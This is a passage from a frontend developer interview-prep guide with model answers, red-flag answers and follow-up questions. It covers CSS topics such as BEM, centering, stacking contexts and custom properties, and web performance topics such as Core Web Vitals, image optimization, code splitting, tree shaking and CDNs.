- **Prevents style leakage:** Since every class is scoped to a block, `.card__title` won't accidentally style `.sidebar__title`.
- **Works with any tech:** Unlike CSS Modules or Styled Components, BEM doesn't require build tools.

**BEM in practice (the nuances people miss):**

1. **Elements of elements are not a thing.** `.card__header__title` is wrong. Flatten it: `.card__title`. The DOM structure and the BEM structure don't need to match 1:1.

2. **When to create a new Block vs an Element:** If the component makes sense in isolation, it's a Block. If it only makes sense inside its parent, it's an Element. A `.button` inside a `.card` is still `.button` (a Block), not `.card__button`.

3. **Modifier with value:** `.card--theme-dark` or `.card--size-large`. This pattern is cleaner for multiple modifier dimensions.

**BEM vs modern alternatives:**
| Approach | Scoping | Build Tool Required | DX |
|---|---|---|---|
| BEM | Convention | No | Verbose but predictable |
| CSS Modules | Hash-based class names | Yes (bundler) | Great DX, no conflicts |
| Tailwind | Utility classes | Yes (build step) | Fast but long class lists |
| CSS-in-JS (Styled Components) | Runtime generated | Yes (runtime cost) | Collocated with components |
| Scoped styles (Vue/Svelte) | Attribute-based | Yes (compiler) | Best of both worlds |

**What interviewers are really testing:** Not whether you've memorized BEM, but whether you understand the problem it solves (global CSS scope) and how it compares to modern solutions. A senior answer discusses the trade-offs between BEM and CSS Modules/Tailwind.

**Red flag answer:** Using BEM with deeply nested element names. Not understanding that BEM is one solution to the "CSS at scale" problem and that alternatives exist.

**Follow-up:**
- In a React project using CSS Modules, do you still need BEM? Why or why not?
- How does Tailwind CSS solve the same problem as BEM, and what are the trade-offs?
- You are starting a new project with 5 frontend developers. How do you decide which CSS methodology to adopt?
</Accordion>

<Accordion title="15. Centering strategies">
**Answer:**

Centering in CSS has historically been a pain point, but modern CSS makes it trivial. The real interview question is *when* to use each method:

**Modern methods (what you should reach for first):**

1. **Flexbox (most versatile):**
```css
.parent {
  display: flex;
  justify-content: center; /* horizontal */
  align-items: center;     /* vertical */
}
```
Works for any number of children. Children can be different sizes.

2. **Grid (most concise):**
```css
.parent {
  display: grid;
  place-items: center; /* shorthand for align-items + justify-items */
}
```
One-liner for single-child centering. `place-content: center` also works.

3. **`margin: auto` (flex/grid child):**
```css
.child {
  margin: auto; /* in a flex or grid container, auto margins absorb extra space */
}
```
Elegant for centering a single child. Also: `margin-inline: auto` for horizontal-only centering in block layout.

**Legacy methods (still relevant for specific cases):**

4. **Absolute positioning + transform:**
```css
.child {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
```
Useful when you need to center something relative to a positioned ancestor without affecting document flow. Common for overlays and modals.

5. **`inset: 0` + `margin: auto`:**
```css
.child {
  position: absolute;
  inset: 0;
  margin: auto;
  width: fit-content;
  height: fit-content;
}
```
Modern version of the absolute centering hack. The `<dialog>` element uses this pattern by default.

**The `<dialog>` element -- the modern centering MVP:**
```css
dialog::backdrop { /* free centering + backdrop */ }
```
A `<dialog>` with `showModal()` is automatically centered in the viewport with a backdrop, no CSS needed. For modals, this is the correct answer.

**What interviewers are really testing:** Whether you can pick the right tool for the situation. Using absolute positioning to center a nav item is overkill; using Grid for a full page layout is appropriate.

**Red flag answer:** Only knowing the `absolute + transform` method (suggests outdated knowledge). Using `display: table-cell; vertical-align: middle` (2010 era).

**Follow-up:**
- How would you vertically center text within a variable-height container that also needs to be scrollable if content overflows?
- What is `place-content` vs `place-items` in Grid, and when do they differ?
- How does the native `<dialog>` element handle centering, and why should you prefer it for modals?
</Accordion>

<Accordion title="16. Responsive Design">
**Answer:**

Responsive design ensures interfaces work across all viewport sizes. The modern approach goes far beyond media queries:

**Core techniques:**

1. **Media Queries** -- The foundation, but use as a last resort after intrinsic sizing:
```css
@media (min-width: 768px) { /* tablet and up */ }
```
**Mobile-first** (`min-width`) is standard practice: start with the mobile layout, enhance for larger screens.

2. **Container Queries (the game-changer):**
```css
.card-container { container-type: inline-size; }
@container (min-width: 400px) {
  .card { flex-direction: row; }
}
```
Styles based on the **parent container's size**, not the viewport. This means a card component can adapt whether it's in a sidebar (narrow) or the main content area (wide). This is the biggest CSS advancement for responsive design since media queries.

3. **Fluid Typography with `clamp()`:**
```css
font-size: clamp(1rem, 0.5rem + 2vw, 2.5rem);
```
Smoothly scales between a minimum and maximum size based on viewport width. No breakpoints, no media queries. The formula ensures readable text at any viewport size.

4. **Intrinsic Sizing:**
- `min()`, `max()`, `clamp()` for any property (not just font-size).
- `width: min(90%, 1200px)` -- responsive max-width without media queries.
- Grid's `minmax(250px, 1fr)` + `auto-fill` for responsive grids without breakpoints.

5. **Relative Units:**
- `rem` -- Relative to root font-size. Preferred for font sizes and spacing (respects user zoom settings).
- `em` -- Relative to parent font-size. Useful for padding/margin that should scale with text.
- `vh`/`vw` -- Viewport units. **Gotcha:** on mobile, `100vh` doesn't account for the address bar. Use `100dvh` (dynamic viewport height) instead.
- `svh`/`lvh`/`dvh` -- Small, Large, Dynamic viewport heights. `dvh` updates as the mobile toolbar appears/disappears.

6. **Responsive Images:**
```html
<picture>
  <source media="(min-width: 800px)" srcset="large.webp" type="image/webp">
  <source media="(min-width: 800px)" srcset="large.jpg">
  <img src="small.jpg" alt="..." loading="lazy">
</picture>
```
Art direction (different crops for different sizes) + format negotiation (WebP where supported).

**What interviewers are really testing:** Whether you know modern responsive techniques beyond basic media queries. Container Queries, `clamp()`, and `dvh` are the differentiators.

**Red flag answer:** Only knowing media queries and fixed breakpoints. Using `px` for everything. Not knowing about Container Queries.

**Follow-up:**
- How do Container Queries change component architecture compared to media queries?
- What is the "new viewport units" story (`svh`, `lvh`, `dvh`), and why was `100vh` problematic on mobile?
- You need a responsive data table that shows all columns on desktop but condenses on mobile. What are your options?
</Accordion>

<Accordion title="17. Stacking Context (z-index)">
**Answer:**

Stacking contexts are one of the most misunderstood parts of CSS. The core principle: **`z-index` only works within the same stacking context, and creating a new context isolates its children's z-ordering from the outside world.**

**What creates a new stacking context:**
- `position: relative/absolute/fixed/sticky` with a `z-index` value other than `auto`
- `opacity` &lt; 1
- `transform`, `filter`, `perspective`, `clip-path` (any value)
- `isolation: isolate` (explicitly creates a context without side effects)
- Flex/Grid children with `z-index` (even without `position`)
- `will-change` with a value that would create a context
- `contain: layout` or `contain: paint`

**The common debugging scenario:**

You set `z-index: 9999` on a dropdown, but it still appears behind a modal. Why? Because the dropdown's parent has `transform: translateZ(0)` (maybe for a GPU animation hack), which creates a new stacking context. The dropdown's `z-index: 9999` only competes with siblings *inside that context*, not with elements outside it.

**The fix:**
1. First, use `isolation: isolate` on the elements you intentionally want to be context roots (like your modal container). This creates a stacking context without side effects.
2. Establish a z-index scale for your app:
```css
:root {
  --z-dropdown: 100;
  --z-sticky: 200;
  --z-modal-backdrop: 300;
  --z-modal: 400;
  --z-toast: 500;
}
```
3. Avoid `z-index` values over 1000. If you need `z-index: 9999`, your architecture is broken.

**Why this matters for component libraries:** When you build a `<Modal>` component, you typically render it via a **portal** (React Portal, Vue Teleport) to the `<body>`. This escapes the parent's stacking context entirely, which is *why* portals exist -- to solve the z-index containment problem.

**What interviewers are really testing:** Have you debugged a z-index issue that wasn't solved by "just make it higher"? Understanding stacking contexts is the mark of a developer who has built complex layered UIs (modals, tooltips, dropdowns coexisting).

**Red flag answer:** "Just increase the z-index." Not knowing what creates a stacking context. Never having used `isolation: isolate`.

**Follow-up:**
- Why do React Portals and Vue Teleport exist, and how do they relate to stacking contexts?
- You have a tooltip that appears behind a sibling's modal. Both are z-indexed. How do you debug this?
- How does `isolation: isolate` differ from `position: relative; z-index: 0` in creating a stacking context?
</Accordion>

<Accordion title="18. Pseudo-classes vs Pseudo-elements">
**Answer:**

Despite the similar names, these serve fundamentally different purposes:

**Pseudo-classes** -- Select elements based on **state or position** in the DOM. They don't create new elements; they target existing ones in specific conditions.
- **State:** `:hover`, `:focus`, `:active`, `:checked`, `:disabled`, `:valid`, `:invalid`
- **Structural:** `:first-child`, `:nth-child(2n+1)`, `:last-of-type`, `:empty`
- **Functional:** `:is()`, `:where()`, `:not()`, `:has()`

**The `:has()` pseudo-class is the biggest recent addition to CSS:**
```css
/* Style a card that contains an image */
.card:has(img) { padding: 0; }
/* Style a label when its sibling input is invalid */
label:has(+ input:invalid) { color: red; }
```
Previously called the "parent selector" -- it's actually more powerful than that. It can select based on any descendant, sibling, or state within.

**Pseudo-elements** -- Create **virtual elements** that don't exist in the DOM but can be styled and rendered. Denoted by `::` (double colon).
- `::before` / `::after` -- Generate content before/after the element's content. Require `content: ""`. Common for decorative elements, icons, tooltips, clearing floats.
- `::placeholder` -- Styles the placeholder text in inputs.
- `::selection` -- Styles highlighted text.
- `::marker` -- Styles list item markers (bullets, numbers).
- `::backdrop` -- Styles the backdrop behind `<dialog>` and fullscreen elements.

**Key differences:**
- Pseudo-classes use single colon (`:hover`), though browsers accept `::` for legacy ones.
- Pseudo-elements use double colon (`::before`), though browsers accept `:` for legacy ones.
- Pseudo-elements create renderable content; pseudo-classes don't.
- `::before`/`::after` content is not in the DOM, so it's not accessible to screen readers (unless using `content: "text" / "alt text"` -- experimental).

**Real production use of `::before`/`::after`:**
```css
/* Custom checkbox using pseudo-element */
.checkbox::before {
  content: "";
  display: inline-block;
  width: 18px; height: 18px;
  border: 2px solid currentColor;
  border-radius: 3px;
}
.checkbox:checked::before {
  background: currentColor;
}
```

**What interviewers are really testing:** Whether you know the fundamental distinction and can apply pseudo-elements practically. The `:has()` pseudo-class knowledge signals you're current with CSS.

**Red flag answer:** Not knowing the `::` vs `:` distinction. Thinking pseudo-elements are accessible to screen readers. Not knowing `:has()` exists.

**Follow-up:**
- Can you give a practical example of `:has()` solving a problem that previously required JavaScript?
- Are `::before`/`::after` accessible to screen readers? What are the implications?
- What is the difference between `:nth-child()` and `:nth-of-type()`, and when does it matter?
</Accordion>

<Accordion title="19. CSS Variables (Custom Properties)">
**Answer:**

CSS Custom Properties are native variables that are scoped to the DOM, cascade like any other CSS property, and can be manipulated at runtime with JavaScript.

**How they work:**
```css
:root {
  --color-primary: #3b82f6;
  --spacing-md: 1rem;
}
.button {
  background: var(--color-primary);
  padding: var(--spacing-md);
}
```

**Key characteristics that differentiate them from preprocessor variables (Sass/Less):**
1. **Cascade and inherit:** Custom properties follow the CSS cascade. A child element inherits `--color-primary` from its parent. You can override them at any DOM level.
2. **Runtime dynamic:** JavaScript can read (`getComputedStyle(el).getPropertyValue('--color-primary')`) and write (`el.style.setProperty('--color-primary', '#ef4444')`) them. This is how theme switching works without rebuilding CSS.
3. **DOM-scoped:** A custom property set on `.dark-theme` only applies to descendants of elements with that class.
4. **Respond to media queries:**
```css
@media (prefers-color-scheme: dark) {
  :root { --color-bg: #1a1a1a; }
}
```

**CSS Variables vs Sass/Less variables:**
- Sass variables are **compile-time constants**. `$color: red` is replaced with `red` in the output CSS. No runtime awareness, no cascading, no JS interaction.
- CSS Custom Properties are **runtime values** that exist in the browser. They can change based on context, state, or JavaScript.
- **Use both together:** Sass variables for design tokens that never change at runtime (breakpoints, font stacks), CSS Custom Properties for things that should be dynamic (theme colors, component variants).

**Advanced patterns:**
```css
/* Component-level API using custom properties */
.button {
  --btn-bg: var(--color-primary);
  --btn-padding: var(--spacing-md);
  background: var(--btn-bg);
  padding: var(--btn-padding);
}
.button--danger {
  --btn-bg: var(--color-danger); /* override just the variable */
}
```
This creates a "component API" where modifiers only need to change variables, not duplicate property declarations.

**Fallback values:** `var(--color, #000)` provides a fallback if `--color` is not defined. You can even chain: `var(--color-override, var(--color-default, #000))`.

**What interviewers are really testing:** Do you understand the runtime nature of CSS Custom Properties and how they differ from preprocessor variables? Can you design a theme system with them?

**Red flag answer:** Treating CSS Custom Properties and Sass variables as interchangeable. Not understanding that Custom Properties cascade and can be overridden per-element.

**Follow-up:**
- How would you implement a light/dark theme toggle using CSS Custom Properties? What about system preference detection?
- What happens if you set a CSS Custom Property to an invalid value for the property it's used in? (Hint: it's not the same as the fallback.)
- How do CSS Custom Properties interact with CSS `@property` registered properties for type checking and animation?
</Accordion>

<Accordion title="20. Containing Block">
**Answer:**

The containing block is the **reference rectangle** that determines how percentage-based sizes, positioning offsets (`top`, `left`), and some other properties are resolved for an element.

**How the containing block is determined:**
- **`position: static` or `position: relative`**: The containing block is the content area of the nearest **block-level ancestor** (the parent's content box).
- **`position: absolute`**: The containing block is the padding box of the nearest ancestor with `position` != `static` (relative, absolute, fixed, or sticky). If none exists, it's the **initial containing block** (the viewport for continuous media).
- **`position: fixed`**: The containing block is normally the **viewport**. **But** if any ancestor has `transform`, `perspective`, `filter`, or `will-change: transform`, that ancestor becomes the containing block. This is a notorious source of bugs: a `position: fixed` header breaks if a parent has `transform: translateZ(0)`.
- **`position: sticky`**: The containing block is the nearest ancestor with a scroll mechanism (overflow != visible).

**Why this matters in production:**

The `position: fixed` + `transform` interaction is the #1 containing block bug. Scenario: You have a fixed header. A developer adds `transform: translateZ(0)` to a parent for GPU acceleration. Suddenly, the "fixed" header scrolls with the page because its containing block changed from the viewport to the transformed ancestor.

**Percentage resolution:**
- `width: 50%` = 50% of the containing block's width.
- `height: 50%` = 50% of the containing block's height. **Gotcha:** if the containing block has no explicit height (auto), `height: 50%` resolves to nothing (the element collapses).
- `padding-top: 10%` = 10% of the containing block's **width** (not height!). This is the classic aspect-ratio hack (now replaced by `aspect-ratio` property).

**What interviewers are really testing:** Whether you understand why elements sometimes appear in unexpected positions, and whether you can trace the containing block chain to debug layout issues.

**Red flag answer:** Saying "the containing block is the parent" without qualifying by position type. Not knowing about the `transform` + `position: fixed` interaction.

**Follow-up:**
- You have a `position: fixed` element that is no longer fixed to the viewport. What is the first thing you check?
- Why does `padding-top: 50%` create a square, and what was this used for before the `aspect-ratio` property?
- How does `position: sticky` determine its "stuck" boundary, and what causes it to fail silently?
</Accordion>

<Accordion title="21. LCP (Largest Contentful Paint)">
**Answer:**

LCP measures when the **largest visible content element** (typically hero image, heading, or video poster) finishes rendering in the viewport. It is the primary metric for perceived load speed.

**Thresholds:** Good: &lt; 2.5s | Needs Improvement: 2.5-4s | Poor: &gt; 4s (measured at the 75th percentile of page loads).

**What counts as the LCP element:**
- `<img>` elements (including `<picture>` source)
- `<video>` poster images
- Elements with background images via `url()`
- Block-level text elements (`<h1>`, `<p>`, etc.)
- **Not:** `<svg>`, `<canvas>`, or video playback frames.

**The four sub-parts of LCP (and how to optimize each):**

1. **Time to First Byte (TTFB)** -- Server response time. Optimize: CDN, server-side caching, edge rendering, database optimization. Target: &lt; 200ms for static, &lt; 600ms for dynamic.

2. **Resource Load Delay** -- Time between TTFB and when the browser starts loading the LCP resource. This is often the biggest offender: the LCP image might be referenced in CSS (not discovered by preload scanner) or loaded via JavaScript. **Fix:** `<link rel="preload">` the LCP image in `<head>`. Use `fetchpriority="high"` on the LCP `<img>`.

3. **Resource Load Duration** -- How long the LCP resource takes to download. **Fix:** compress images (WebP/AVIF), use responsive `srcset` to serve appropriately-sized images, set up a CDN for edge delivery.

4. **Element Render Delay** -- Time between resource loaded and pixel painted. Usually caused by render-blocking CSS/JS. **Fix:** inline critical CSS, defer non-critical JS.

**Real-world example:** An e-commerce site had LCP of 4.8s. The LCP element was the hero product image. Investigation revealed: (1) the image was loaded via a CSS `background-image` (invisible to preload scanner), (2) it was a 2MB PNG. Fix: converted to an `<img>` tag with `fetchpriority="high"`, switched to AVIF (180KB), added `<link rel="preload">`. LCP dropped to 1.9s.

**What interviewers are really testing:** Can you decompose LCP into its sub-parts and systematically optimize each one? Just saying "optimize images" is too vague.

**Red flag answer:** Not knowing that LCP is about the *largest* element, not the first. Not mentioning `fetchpriority` or `preload`. Thinking LCP only applies to images.

**Follow-up:**
- Your LCP element is a hero image, but it is loaded via JavaScript (lazy loaded). What is wrong with this, and how do you fix it?
- How does `fetchpriority="high"` differ from `<link rel="preload">` for optimizing LCP?
- Can the LCP element change during page load? How does that affect optimization?
</Accordion>

<Accordion title="22. INP (Interaction to Next Paint)">
**Answer:**

INP (Interaction to Next Paint) measures **how responsive your page is to user interactions** across the entire page lifecycle. It replaced FID (First Input Delay) in March 2024 as a Core Web Vital because FID only measured the *first* interaction, not the overall experience.

**Thresholds:** Good: &lt; 200ms | Needs Improvement: 200-500ms | Poor: &gt; 500ms.

**What INP measures (three phases of each interaction):**
1. **Input Delay** -- Time from user interaction to the start of your event handler. Caused by the main thread being busy (long tasks, expensive rendering).
2. **Processing Time** -- Time your event handler(s) take to execute.
3. **Presentation Delay** -- Time from handler completion to the next frame being painted (includes style recalculation, layout, paint).

INP records the latency of *all* interactions (clicks, taps, key presses -- not scroll or hover) and reports approximately the worst interaction (technically, the highest latency with one allowed outlier per 50 interactions).

**Optimization strategies:**

1. **Break up long tasks:** Any task &gt; 50ms is a "long task" that can delay input handling. Use `scheduler.yield()` (new API) or `setTimeout(fn, 0)` or `requestIdleCallback` to break work into chunks. In React, this is why Concurrent Mode and `useTransition` exist -- they yield back to the browser between renders.

2. **Minimize DOM size:** Each interaction triggers style recalculation proportional to DOM size. Keep DOM under 1,400 elements where possible. Virtualize long lists (`react-window`, `@tanstack/virtual`).

3. **Avoid layout thrashing in handlers:** If your click handler reads layout properties and then writes style changes, you force synchronous layout.

4. **Debounce/throttle expensive handlers:** Keystroke handlers that trigger search should debounce (wait for pause), not fire on every keystroke.

5. **Use `content-visibility: auto`:** Skip rendering for off-screen content entirely.

**Real-world debugging:** Chrome DevTools' Performance panel has an "Interactions" track that shows each interaction's three phases. The "Long Animation Frames" API (`LoAF`) provides programmatic access to identify which scripts cause delays.

**What interviewers are really testing:** Whether you understand the difference between INP and FID, and whether you can optimize for interaction responsiveness beyond the first click. Mentioning `scheduler.yield()`, `useTransition`, or the LoAF API shows current knowledge.

**Red flag answer:** Confusing INP with FID. Only mentioning "break up long tasks" without explaining *how*. Not knowing that INP considers all interactions, not just the first.

**Follow-up:**
- How does React's `useTransition` help with INP, and what is the underlying mechanism?
- What is `scheduler.yield()` and how does it compare to `setTimeout(0)` for yielding to the main thread?
- A page has good INP on desktop but poor INP on mobile. What are the most likely causes?
</Accordion>

<Accordion title="23. CLS (Cumulative Layout Shift)">
**Answer:**

CLS measures **visual stability** -- how much the page content unexpectedly shifts during loading. It quantifies the frustrating experience of clicking a button and hitting an ad that just loaded above it.

**Thresholds:** Good: &lt; 0.1 | Needs Improvement: 0.1-0.25 | Poor: &gt; 0.25.

**How CLS is calculated:**
- For each unexpected layout shift: `impact fraction * distance fraction`
  - **Impact fraction:** Percentage of the viewport affected by the shift.
  - **Distance fraction:** How far elements moved as a proportion of the viewport.
- Shifts are grouped into "session windows" (max 5s, max 1s gap between shifts). CLS is the **largest session window's total score**.
- **User-initiated shifts don't count:** Shifts within 500ms of a user interaction (click, tap, keypress) are excluded. This is why expanding an accordion on click doesn't hurt CLS, but an ad loading 3 seconds after page load does.

**Common causes and fixes:**

1. **Images/videos without dimensions:**
```html
<!-- BAD: causes layout shift when image loads -->
<img src="photo.jpg" alt="...">

<!-- GOOD: reserves space -->
<img src="photo.jpg" alt="..." width="800" height="600">
<!-- Or use aspect-ratio -->
<img src="photo.jpg" alt="..." style="aspect-ratio: 4/3; width: 100%;">
```

2. **Dynamically injected content:** Ads, embeds, cookie banners, and late-loading widgets. **Fix:** Reserve space with `min-height` or use `content-visibility` with `contain-intrinsic-size`.

3. **Web fonts causing FOUT (Flash of Unstyled Text):** When a web font loads and replaces the fallback, text reflows. **Fix:** Use `font-display: optional` (skips the font if not loaded quickly) or `size-adjust` on the fallback font to match metrics:
```css
@font-face {
  font-family: 'Fallback';
  src: local('Arial');
  size-adjust: 105%; /* match web font metrics */
  ascent-override: 90%;
}
```

4. **Late-loading content above the viewport:** Content pushing everything below it down. **Fix:** Use `transform` animations (don't affect layout) instead of animating `height`/`margin`.

**What interviewers are really testing:** Whether you have dealt with CLS in production. The font `size-adjust` trick and understanding session windows shows deep knowledge.

**Red flag answer:** Only mentioning "add width/height to images." Not knowing about the session window calculation or that user-initiated shifts are excluded.

**Follow-up:**
- How does `font-display` affect CLS, and what are the trade-offs between `swap`, `optional`, and `fallback`?
- A page has a CLS of 0.35. The DevTools Performance panel shows the shift happens 2 seconds after load. How do you identify the culprit element?
- How do late-loading ads affect CLS, and what strategies can you use to mitigate their impact?
</Accordion>

<Accordion title="24. Image Optimization">
**Answer:**

Images typically account for **50-70% of a web page's total weight**. Optimizing them is the highest-ROI performance work you can do.

**Format selection (in order of preference):**
- **AVIF** -- Best compression (50% smaller than JPEG at same quality). Supports HDR, animation, transparency. Slow to encode. Support: Chrome, Firefox, Safari 16.4+.
- **WebP** -- 25-34% smaller than JPEG. Supports transparency and animation. Universal browser support.
- **JPEG** -- Fallback for oldest browsers. Still good for photos.
- **PNG** -- Only when you need lossless with transparency and can't use WebP/AVIF.
- **SVG** -- Vector graphics, icons, logos. Infinitely scalable, often smaller than raster for simple shapes.

**Responsive images with `srcset` and `sizes`:**
```html
<img
  src="hero-800.jpg"
  srcset="hero-400.jpg 400w, hero-800.jpg 800w, hero-1200.jpg 1200w"
  sizes="(max-width: 600px) 100vw, (max-width: 1200px) 50vw, 600px"
  alt="Product hero"
  loading="lazy"
  decoding="async"
>
```
The browser uses `sizes` to determine which `srcset` image to download *before* layout. This prevents downloading a 4K image on a phone. **The most common mistake:** omitting `sizes`, which causes the browser to assume `sizes="100vw"` and download the largest image always.

**Lazy loading:**
- `loading="lazy"` -- Native browser lazy loading. Only fetches images when they're near the viewport.
- **Critical exception:** Never lazy-load the LCP image! The LCP image should have `loading="eager"` (default) and `fetchpriority="high"`.
- `decoding="async"` -- Tells the browser it can decode the image off the main thread. Low-risk, always-on improvement.

**Modern techniques:**
- **`<picture>` for art direction:** Serve different image crops for different viewports (not just sizes, but actual different images).
- **CSS `image-set()`:** The `srcset` equivalent for background images.
- **Blur-up placeholders (LQIP):** Show a tiny (20-byte) blurred version while the full image loads. Libraries like `plaiceholder` or `thumbhash` generate these.
- **CDN-based image transformation:** Cloudinary, Imgix, or Cloudflare Images transform images on-the-fly (resize, format-convert, compress) via URL parameters. This eliminates the need to generate multiple sizes at build time.

**What interviewers are really testing:** Whether you can design a complete image optimization pipeline, not just list formats. The `srcset` + `sizes` + lazy loading + format negotiation combination is the bar.

**Red flag answer:** Not knowing about AVIF or WebP. Lazy-loading all images including the LCP image. Not understanding `srcset` and `sizes` interaction.

**Follow-up:**
- How would you set up an automated image optimization pipeline for a content-heavy site with thousands of images?
- What is ThumbHash/BlurHash, and how does it differ from a simple low-resolution placeholder?
- Your site serves images via a CDN. How do you handle serving AVIF to supported browsers and JPEG to others?
</Accordion>

<Accordion title="25. Code Splitting">
**Answer:**

Code splitting breaks your JavaScript bundle into smaller chunks loaded on demand, so users only download the code they actually need for the current view.

**Types of code splitting:**

1. **Route-based splitting (most impactful):**
```jsx
// React with lazy loading
const Dashboard = React.lazy(() => import('./Dashboard'));
const Settings = React.lazy(() => import('./Settings'));

// In router
<Suspense fallback={<Spinner />}>
  <Route path="/dashboard" element={<Dashboard />} />
  <Route path="/settings" element={<Settings />} />
</Suspense>
```
Each route's code is a separate chunk loaded only when the user navigates there. This is the #1 code splitting strategy.

2. **Component-based splitting:**
```jsx
// Load heavy component on demand
const HeavyChart = React.lazy(() => import('./HeavyChart'));

// Only loads when isVisible is true
{isVisible && (
  <Suspense fallback={<Skeleton />}>
    <HeavyChart data={data} />
  </Suspense>
)}
```
Useful for heavy components that are conditionally rendered (modals, charts, editors).

3. **Library-based splitting:** Import heavy libraries only when needed:
```javascript
// Instead of: import moment from 'moment' (67KB gzipped)
const formatDate = async (date) => {
  const { format } = await import('date-fns/format'); // 2KB gzipped
  return format(date, 'yyyy-MM-dd');
};
```

**How bundlers handle it:**
- Webpack uses `import()` as split points and creates chunk files. `webpackChunkName` magic comments control naming. `webpackPrefetch` triggers `<link rel="prefetch">` for likely-needed chunks.
- Vite (Rollup) does the same with `import()` and has better default chunking via `manualChunks`.
- `splitChunks` configuration controls which modules go into shared chunks (vendor code used by multiple routes should be in a shared chunk, not duplicated).

**The waterfall problem:** Code splitting can create request waterfalls: load route chunk -> discovers it needs a library chunk -> loads that -> discovers it needs data. **Solutions:** prefetch likely chunks, use `modulepreload`, or use a module preload manifest (frameworks like Next.js handle this automatically).

**What interviewers are really testing:** Not just "what is it" but "how do you decide what to split and when." Over-splitting creates too many network requests; under-splitting sends too much code. The judgment call is the interesting part.

**Red flag answer:** "Just use React.lazy for everything." Not understanding the waterfall problem that splitting creates. Not knowing the difference between `prefetch` and `preload` for chunks.

**Follow-up:**
- How do you decide the granularity of code splitting? What is the trade-off between too many chunks and too few?
- What is the "waterfall problem" with code splitting, and how do frameworks like Next.js solve it?
- How would you analyze your bundle to identify code splitting opportunities? What tools would you use?
</Accordion>

<Accordion title="26. Tree Shaking">
**Answer:**

Tree shaking is **dead code elimination** based on ES Module static analysis. The bundler determines which exports from a module are actually imported and removes everything else.

**How it works:**
1. The bundler builds a dependency graph using `import`/`export` statements (which are statically analyzable -- unlike `require()`).
2. It marks all reachable exports ("used exports") starting from entry points.
3. Unreachable exports are removed from the final bundle.

**Why ES Modules are required:**
- `import`/`export` are **static** -- the module structure is determinable at compile time.
- `require()` (CommonJS) is **dynamic** -- you can write `require(condition ? 'a' : 'b')`, so the bundler can't statically know what's used. This is why tree shaking doesn't work with CommonJS.

**The `sideEffects` field in `package.json`:**
```json
{
  "sideEffects": false
}
```
This tells the bundler: "Every file in this package is pure -- if its exports aren't used, the whole file can be removed." Without this, the bundler must conservatively keep files that might have side effects (CSS imports, polyfills, module-level initialization code). **This is the #1 reason tree shaking fails in practice.**

**Common reasons tree shaking doesn't work:**
1. **Using CommonJS libraries:** `lodash` (CJS) can't be tree-shaken; `lodash-es` (ESM) can. Using `import _ from 'lodash'` imports the entire 70KB library even if you only use `_.debounce`.
2. **Re-exporting everything:** `export * from './utils'` barrels make it harder for bundlers to trace used exports (though modern bundlers handle this better).
3. **Side effects in modules:** CSS imports (`import './styles.css'`), polyfills (`import 'core-js'`), or any module-level code that runs on import.
4. **Dynamic access patterns:** `obj[dynamicKey]` prevents the bundler from knowing which properties are used.

**Measuring tree shaking effectiveness:**
- `webpack-bundle-analyzer` (visualize chunk contents)
- `source-map-explorer` (trace bytes to source files)
- `bundlephobia.com` (check if a package supports tree shaking before you install it)

**What interviewers are really testing:** Do you understand *why* tree shaking fails and how to debug it? The `sideEffects` field and CJS vs ESM distinction are the key insights.

**Red flag answer:** "Tree shaking automatically removes unused code." True in theory, but it fails silently in many real-world scenarios. Not knowing about the `sideEffects` field or the CJS limitation.

**Follow-up:**
- You import one function from a 100KB library, but your bundle still includes the entire library. How do you diagnose and fix this?
- What are barrel files (`index.ts` with re-exports), and how do they affect tree shaking?
- How does `/*#__PURE__*/` annotation help tree shaking, and when would you use it?
</Accordion>

<Accordion title="27. CDN Usage">
**Answer:**

A CDN (Content Delivery Network) is a geographically distributed network of servers that caches and serves content from the location closest to the user.

**How CDNs improve performance:**
1. **Reduced latency** -- A user in Tokyo hits the Tokyo edge server (~5ms) instead of your origin in Virginia (~150ms). At the speed of light, physical distance creates an irreducible minimum latency (fiber optic: ~5ms per 1000km).
2. **Offload origin server** -- Static assets served from CDN = fewer requests hitting your application server. For high-traffic events (product launches, Black Friday), the CDN absorbs the spike.
3. **Edge caching** -- Frequently requested resources are cached at edge locations. Cache hit ratio is the key metric (target: &gt; 95% for static assets).
4. **Automatic optimization** -- Modern CDNs (Cloudflare, Vercel Edge) can compress (Brotli/gzip), resize images, minify HTML/CSS/JS, and even serve different formats based on `Accept` headers.

**CDN architecture tiers:**
- **Static asset CDN:** Serve JS, CSS, images, fonts. The baseline. (CloudFront, Cloudflare, Fastly)
- **Edge compute CDN:** Run code at edge locations. Cloudflare Workers, Vercel Edge Functions, Deno Deploy. Use for: authentication, A/B testing, personalization, redirects, geolocation-based content.
- **Full-site CDN:** Cache entire HTML pages at the edge. Combined with ISR (Incremental Static Regeneration), you get near-static performance for dynamic content.

**Cache invalidation -- the hard problem:**
- **Content-hashed filenames** (`app.a1b2c3.js`): Infinite cache TTL. New deploys = new filenames = automatic "invalidation."
- **Cache purge:** Manual or API-driven invalidation of specific URLs. Most CDNs complete purge in &lt; 5 seconds globally.
- **`stale-while-revalidate`:** Serve cached content immediately while fetching fresh content in the background.
- **Surrogate keys / cache tags:** Tag cached objects (e.g., `product-123`) and purge by tag when the underlying data changes. Fastly and Cloudflare support this.

**What interviewers are really testing:** Whether you've architected CDN strategies, not just "used a CDN." The cache invalidation strategy and edge compute awareness differentiate senior answers.

**Red flag answer:** "CDNs make things faster." Too vague. Not understanding cache invalidation or TTL strategy.

**Follow-up:**
- How do you handle cache invalidation when you deploy new assets? What if your CDN is still serving stale content?
- When would you use edge compute (Cloudflare Workers, Vercel Edge Functions) vs a traditional CDN?
- How do CDNs handle the `Vary` header, and what gotchas should you be aware of?
</Accordion>

<Accordion title="28. Minification & Compression">
**Answer:**

These are two distinct stages of reducing the bytes sent over the wire:

**Minification (build-time, lossless transformation):**
- **JavaScript:** Remove whitespace, comments; rename variables to shorter names (mangling); remove dead code; inline simple functions. Tools: Terser (standard), esbuild (10-100x faster), SWC (Rust-based).
- **CSS:** Remove whitespace, comments; merge duplicate rules; shorten color values (`#ffffff` -> `#fff`). Tools: cssnano, Lightning CSS.
- **HTML:** Remove whitespace, comments, optional closing tags. Tools: html-minifier-terser.
- **Impact:** Typically 30-60% size reduction for JS, 20-40% for CSS.

**Compression (transfer-time, applied by server/CDN):**
- **Gzip:** Ubiquitous support. Uses DEFLATE algorithm. Good compression ratio.
- **Brotli:** 15-25% smaller than Gzip for text assets. Supported by all modern browsers. Slower to compress at high levels (use level 4-6 for dynamic, level 11 for pre-compressed static assets).
- **Zstandard (zstd):** Emerging alternative. Faster compression/decompression than Brotli at similar ratios. Chrome and Firefox support it as of 2024.

